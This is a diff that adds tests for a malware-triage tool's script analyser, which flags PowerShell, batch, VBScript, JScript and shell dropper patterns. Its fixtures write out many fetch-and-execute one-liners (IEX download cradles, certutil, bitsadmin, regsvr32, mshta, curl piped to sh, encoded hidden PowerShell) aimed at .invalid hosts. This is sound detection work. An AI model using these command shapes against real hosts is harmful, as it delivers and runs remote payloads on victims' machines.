@@ -54,6 +54,7 @@ from maltriage import vba as vba_module
 from maltriage import msdoc as msdoc_module
 from maltriage import xlm as xlm_module
 from maltriage import diff as diff_module
+from maltriage import scripts as scripts_module
 from maltriage import base as base_module
 from maltriage import elf as elf_module
 from maltriage import pe as pe_module
@@ -10292,3 +10293,260 @@ def test_a_long_wide_run_does_not_start_after_a_printable_byte():
     from a backwards walk that never asked the pattern."""
     data = b"7" + "http://a.example".encode("utf-16-le") + b"\x00"
     assert _same_at_every_chunk_size(data)["urls"] == []
+
+
+# v0.7.2: script files
+#
+# Every control here is harmless: the "payloads" are calc, notepad and URLs
+# under .invalid. Measured during development on 923 real scripts from the
+# PowerShell, PowerShellGet, PSReadLine and Chocolatey repositories:
+# `script_dropper` on 3, all real installers that download and run.
+
+def _script(write, name, text, encoding="utf-8", bom=b""):
+    report = analyse(write(name, bom + text.encode(encoding)))
+    return report, report.data.get("script") or {}
+
+
+def _script_keys(report):
+    return {f["key"]: f for f in report.findings if f["key"].startswith("script_")}
+
+
+_DROPPERS = [
+    ("a.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://x.invalid/a')",
+     "PowerShell download cradle"),
+    ("a.ps1", "$u='http://x.invalid/a'\niwr $u -UseBasicParsing | iex", "PowerShell download cradle"),
+    ("a.bat", "@echo off\r\npowershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBi\r\n",
+     "encoded PowerShell launch"),
+    ("a.ps1", "$s=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b)); IEX $s",
+     "base64 decoded and invoked"),
+    ("a.bat", "certutil -urlcache -split -f http://x.invalid/a.exe %TEMP%\\a.exe\r\n",
+     "certutil fetching a URL"),
+    ("a.bat", "bitsadmin /transfer job /download /priority high http://x.invalid/a %TEMP%\\a\r\n",
+     "bitsadmin fetching a URL"),
+    ("a.vbs", 'Set s = CreateObject("WScript.Shell")\r\ns.Run "mshta http://x.invalid/a.hta", 0\r\n',
+     "mshta running remote script"),
+    ("a.bat", "regsvr32 /s /n /u /i:http://x.invalid/a.sct scrobj.dll\r\n",
+     "regsvr32 loading a remote scriptlet"),
+    ("a.bat", 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";alert(1)\r\n',
+     "rundll32 running script"),
+    ("a.bat", "msiexec /q /i http://x.invalid/a.msi\r\n", "msiexec installing from a URL"),
+    ("a.sh", "#!/bin/sh\ncurl -s http://x.invalid/a | sh\n", "download piped to a shell"),
+    ("a.sh", "#!/bin/bash\nbash <(wget -qO- http://x.invalid/a)\n", "download piped to a shell"),
+    ("a.js", 'var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("GET","http://x.invalid/a",false);'
+             ' var s = new ActiveXObject("ADODB.Stream"); s.SaveToFile("a.exe");'
+             ' new ActiveXObject("WScript.Shell").Run("a.exe");', "WSH download written to disk and run"),
+]
+
+
+@pytest.mark.parametrize("name, text, shape", _DROPPERS)
+def test_each_dropper_shape_reaches_the_gate(write, name, text, shape):
+    report, data = _script(write, name, text)
+    finding = _script_keys(report)["script_dropper"]
+
+    assert shape in data["shapes"]
+    assert finding["severity"] == "medium"
+    assert at_gate(report, "medium")
+
+
+@pytest.mark.parametrize("name, text", [
+    ("build.ps1", "param([string]$Version)\n$env:PATH += ';C:\\tools'\n"
+                  "Invoke-WebRequest -Uri https://x.invalid/tool.zip -OutFile tool.zip\n"
+                  "Expand-Archive tool.zip -DestinationPath tools\n"
+                  "Start-Process -FilePath tools\\setup.exe -Wait\n"),
+    ("logon.vbs", 'Dim s\r\nSet s = CreateObject("WScript.Shell")\r\ns.Run "notepad.exe", 1\r\n'),
+    ("copy.bat", "@echo off\r\nsetlocal\r\nxcopy /e /y src dst\r\nif exist dst\\a.txt echo done\r\n"),
+    ("deploy.sh", "#!/bin/bash\nset -e\ncurl -fsSL -o pkg.tgz https://x.invalid/pkg.tgz\ntar xzf pkg.tgz\n"),
+])
+def test_an_ordinary_script_that_downloads_or_runs_stays_below_the_gate(write, name, text):
+    """Downloading a tool and starting a process are what build and logon
+    scripts do. Neither is a dropper's shape."""
+    report, data = _script(write, name, text)
+    assert data["shapes"] == []
+    assert not at_gate(report, "medium")
+
+
+def test_a_cradle_quoted_in_help_text_is_not_a_cradle(write):
+    """Two of four matches on 923 real scripts were the official install
+    one-liner quoted in a comment. A line that starts as a comment cannot
+    run, so it is not read for shapes."""
+    text = ("<#\n.EXAMPLE\n    Invoke-Expression \"& { $(Invoke-RestMethod 'https://x.invalid/i.ps1') }\"\n#>\n"
+            "# iex (iwr https://x.invalid/a)\nparam([string]$Path)\n$x = Get-Item $Path\n")
+    report, data = _script(write, "install.ps1", text)
+    assert data["language"] == "powershell" and data["shapes"] == []
+
+
+def test_a_comment_marker_inside_a_line_hides_nothing(write):
+    """Only whole lines are comments: a `#` after code may be inside a
+    string, and stripping from it would hide what follows."""
+    text = 'param([string]$a)\n$h = "#"; IEX (New-Object Net.WebClient).DownloadString("http://x.invalid/a")\n'
+    assert "PowerShell download cradle" in _script(write, "a.ps1", text)[1]["shapes"]
+
+
+def test_decoding_and_invoking_on_different_lines_is_not_the_shape(write):
+    """Microsoft's AMSI tests decode EICAR and, two lines later, invoke an
+    `echo` of it. The one-liners do both in one statement."""
+    text = ("param()\n$b = [System.Convert]::FromBase64String($E)\n$t = 'x'\n"
+            "{ Invoke-Expression -Command \"echo '$t'\" } | Should -Throw\n")
+    assert _script(write, "a.Tests.ps1", text)[1]["shapes"] == []
+
+
+@pytest.mark.parametrize("text, language", [
+    ("param([string]$a)\n$env:X = 1\nGet-ChildItem $a | Out-Null\n", "powershell"),
+    ('Option Explicit\r\nDim a\r\nSet a = CreateObject("Scripting.FileSystemObject")\r\n', "vbscript"),
+    ('var fso = new ActiveXObject("Scripting.FileSystemObject");\nfunction f() {}\n', "jscript"),
+    ("@echo off\r\nset A=1\r\nif exist x goto end\r\n", "batch"),
+    ("#!/bin/bash\nexport A=1\nif [ -f x ]; then echo y; fi\n", "shell"),
+    ('<html><head><HTA:APPLICATION ID="a"/><script language="VBScript">x</script></head></html>', "hta"),
+    ('<package><job id="a"><script language="JScript">WScript.Echo(1)</script></job></package>', "wsf"),
+    ("Dear team, the meeting is at three. Bring the report.\n", None),
+])
+def test_a_script_says_what_language_it_reads_as(write, text, language):
+    assert _script(write, "s.txt", text)[1]["language"] == language
+
+
+def test_a_utf16_powershell_script_is_read(write):
+    """PowerShell scripts are often UTF-16 with a byte order mark."""
+    report, data = _script(write, "a.ps1", "IEX (iwr http://x.invalid/a)\n$x = Get-Date\n",
+                           encoding="utf-16-le", bom=b"\xff\xfe")
+    assert data["language"] == "powershell"
+    assert "script_dropper" in _script_keys(report)
+
+
+def test_a_binary_with_no_magic_is_not_read_as_a_script(write):
+    report = analyse(write("blob.bin", bytes(range(256)) * 40))
+    assert (report.data.get("script") or {}).get("text") is False
+    assert _script_keys(report) == {}
+
+
+def test_the_script_text_never_reaches_the_report(write):
+    report, _ = _script(write, "a.ps1",
+                        "IEX (New-Object Net.WebClient).DownloadString('http://x.invalid/a')\n"
+                        "$marker = 'script_marker_4471'\n")
+    assert "script_marker_4471" not in json.dumps(report.to_dict(), default=str)
+
+
+def test_a_hidden_window_is_noted(write):
+    for text in ("powershell -WindowStyle Hidden -File a.ps1\n", "powershell -w h -c x\n",
+                 'Set s = CreateObject("WScript.Shell")\r\ns.Run "notepad.exe", 0\r\n'):
+        report, _ = _script(write, "a.txt", text)
+        assert "script_hidden_window" in _script_keys(report), text
+
+
+def test_a_long_script_says_what_was_not_read(write):
+    report, data = _script(write, "big.ps1", "$a = 1\n" * 200000)
+    assert any("read the first" in n for n in data["parse_errors"])
+
+
+def test_a_script_inside_a_zip_is_read(write):
+    """Where most of them arrive: `invoice.pdf.js` in an archive."""
+    member = ('var s = new ActiveXObject("WScript.Shell");\n'
+              's.Run("powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj", 0);\n')
+    report = analyse(write("invoice.zip", _zip_bytes([("invoice.pdf.js", member.encode())])))
+    assert at_gate(report, "medium")
+    child = report.children[0]
+    assert child.data["script"]["language"] == "jscript"
+
+
+def test_a_corpus_names_scripts_by_language(tmp_path):
+    benign = tmp_path / "benign"
+    benign.mkdir()
+    (benign / "a.ps1").write_text("param()\n$x = Get-Date\n", encoding="utf-8")
+    (benign / "b.bat").write_text("@echo off\r\nset A=1\r\n", encoding="utf-8")
+    result = corpus_module.scan_corpus(tmp_path)
+    assert result.families["benign"] == {"script-powershell": 1, "script-batch": 1}
+
+
+def test_shape_matching_is_linear_whatever_the_text_repeats():
+    """A gap written as `[^\\n]{0,200}?` inside one regex retries the gap at
+    every occurrence of the first part: 4 MiB of `IEX ` took 33 s."""
+    for text in ("IEX " * 260000, "FromBase64String " * 60000, "powershell -e " * 75000):
+        started = time.perf_counter()
+        scripts_module.scan(text)
+        assert time.perf_counter() - started < 5
+
+
+def test_a_shapes_parts_must_be_within_their_gap(write):
+    """`IEX` and a download verb on one line but far apart are two
+    statements, not a cradle."""
+    text = "param()\n$a = Invoke-Expression $cmd; " + "$pad = 1; " * 40 + "$b = Invoke-WebRequest $u\n"
+    assert _script(write, "a.ps1", text)[1]["shapes"] == []
+
+
+def test_one_feature_is_a_mention_not_a_language(write):
+    """A sentence that starts with `Call` has one batch feature. Two
+    features make a dialect; one is English."""
+    assert _script(write, "note.txt", "Call me when the build is done.\n")[1]["language"] is None
+
+
+def test_fetching_and_running_without_writing_is_not_the_wsh_shape(write):
+    """Posting a status and opening Notepad is two ordinary things; the
+    shape is a download written to disk and then run."""
+    text = ('var x = new ActiveXObject("MSXML2.XMLHTTP"); x.open("POST","http://x.invalid/s",false);'
+            ' new ActiveXObject("WScript.Shell").Run("notepad.exe");')
+    assert _script(write, "a.js", text)[1]["shapes"] == []
+
+
+def test_a_utf16_script_without_a_byte_order_mark_is_read(write):
+    report, data = _script(write, "a.ps1", "param()\n$x = Get-Date\nIEX (iwr http://x.invalid/a)\n",
+                           encoding="utf-16-le")
+    assert data["language"] == "powershell" and data["shapes"]
+
+
+def test_a_binary_is_dropped_after_the_first_look():
+    extractor = scripts_module.ScriptExtractor()
+    extractor.begin(Path("x"), {"family": "unknown"}, DEFAULT_CONFIG)
+    extractor.feed(bytes(range(256)) * 64)
+    extractor.feed(bytes(range(256)) * 4096)
+    assert len(extractor._buffer) == 0
+    assert extractor.finish(Path("x"), {}, DEFAULT_CONFIG) == {"text": False}
+
+
+def _variants(text):
+    """The text, and the text with the letters `re` matches when ignoring
+    case written as the other characters it matches them to."""
+    yield text
+    yield text.upper()
+    yield text.replace("i", "\u0131").replace("I", "\u0130")
+    yield text.replace("s", "\u017f").replace("k", "\u212a").replace("K", "\u212a")
+
+
+def test_the_literal_hints_change_no_answer(monkeypatch):
+    """The hints only skip work. Every shape, capability and hidden window
+    is the same with them and without them, in every case form `re` treats
+    as equal."""
+    texts = [text for _, text, _ in _DROPPERS] + [
+        "Start-Process notepad -WindowStyle Hidden; schtasks /create; cscript a.vbs\n",
+        "Set s = CreateObject(\"Shell.Application\"): s.ShellExecute \"a\", \"\", \"\", \"open\", 0\n",
+        "$p = New-Object Diagnostics.ProcessStartInfo; $p.CreateNoWindow = $true\n",
+        "Get-CimInstance Win32_Process; cmd /c dir\n",
+        "Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)))\n",
+        "Start-BitsTransfer -Source http://x.invalid/a; irm http://x.invalid/b; wget -q http://x.invalid/c\n",
+        "x.open(\"GET\", u); WinHttp.WinHttpRequest.5.1; URLDownloadToFile 0, u, f, 0, 0\n",
+        "#!/bin/sh\necho aGVsbG8= | base64 -d | sh\n",
+        "cmd.exe /c rundll32 a.dll,Run; regsvr32 /s a.dll; mshta a.hta\n",
+    ]
+    for original in texts:
+        for text in _variants(original):
+            hinted = scripts_module.scan(text)
+            monkeypatch.setattr(scripts_module, "_USE_HINTS", False)
+            plain = scripts_module.scan(text)
+            monkeypatch.setattr(scripts_module, "_USE_HINTS", True)
+            assert hinted == plain, text
+
+
+def test_every_character_re_matches_to_a_letter_folds_to_it():
+    """The hints are case-folded literals; `_FOLD` covers the characters
+    case folding alone does not take to a bare ASCII letter. If a Python
+    release adds one, this fails rather than a hint silently skipping it."""
+    for code in range(0x80, 0x110000):
+        char = chr(code)
+        for letter in "abcdefghijklmnopqrstuvwxyz":
+            if re.fullmatch(letter, char, re.IGNORECASE):
+                assert char.translate(scripts_module._FOLD).casefold() == letter, hex(code)
+
+
+def test_ordinary_text_is_cheap_to_rule_out():
+    text = "Write-Host 'hello world'\n" * 40000
+    started = time.perf_counter()
+    scripts_module.scan(text)
+    assert time.perf_counter() - started < 0.6
